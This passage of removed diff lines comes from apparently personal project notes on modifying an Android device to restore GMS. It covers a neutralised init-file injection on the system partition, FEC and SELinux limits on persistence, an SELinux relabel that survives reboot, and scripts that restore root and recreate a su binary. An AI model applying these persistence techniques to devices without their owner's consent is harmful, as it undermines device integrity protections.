-- **The injected `/system/etc/init/perfetto.rc` is NEUTRALIZED to a marker payload** (the three
-  dangerous `mount` lines removed; only `setprop gl.boot.injected 1`). Written to EROFS block
-  **`sdd71@139218`** (super phys `570236928` = `139218 x 4096`); marker-block sha256 =
-  **`1be82ca9fba253332ac00e2ee61bbbea061028b440647f8c19f6d03f990238fe`**.
-  **After a cold boot (measured)**: `getprop gl.boot.injected == 1`, **no** `/system` overlay in
-  `mount`, normal boot (uptime OK / `perf_event_paranoid=3`), and `cat
-  /system/etc/init/perfetto.rc` returns the marker content.
-  (Sources: `evidence/CHANGE09_neutralize_marker.txt`,
-  `docs/session_20260926/PERSISTENCE_SAFETY_ARCHITECTURE_20260926.md` §5.)
-- **Persistence, honestly**: a single-block EROFS change is **silently corrected by FEC**
-  (`docs/session_20260926/FEC_ANALYSIS_20260926.md`), and boot-binary replacement is **DEAD**
-  under SELinux (`mounton system_file` is init-only; execs typetransition out of init)
-  (`docs/session_20260926/PERSISTENCE_RAW_SUPER_20260926.md` §47-57,
-  `BL_STATIC_ANALYSIS_20260926.md`). So **native GMS remains per-boot overlay only**
-  (`POSTMORTEM_BRICK_20260926.md`).
-- **The safe boot-hook invariant SI-2 holds on the device**: a `chcon u:object_r:system_file:s0`
-  on `/data/gls` survives a reboot (init does not blanket-restorecon `/data`). The actual
-  boot-time lower-only mount (P3) is **not yet tested**.
-  (Source: `evidence/CHANGE10_label_persistence.txt`.)
-- Added to `docs/session_20260926/`: LATEST_CODE_SUMMARY / PERSISTENCE_SAFETY_ARCHITECTURE /
-  POSTMORTEM_BRICK / FEC_ANALYSIS / PERSISTENCE_RAW_SUPER / ROOTSHELL_MEMO / BL_STATIC_ANALYSIS /
-  CHANGE_01 / CHANGE_02 / CHANGE_08. Added `evidence/CHANGE01-10`.
-- GMS repository: canonical is `scripts/gms_restore.sh` (v6/v7, sha256 `6B023043...`), plus the new
-  **`scripts/restore_root.sh`** (root-only derivation: `--root` + name-independent root probe) and
-  **`scripts/provision.sh`** (recreates `/data/local/tmp/su`). See gms README §3/§8.
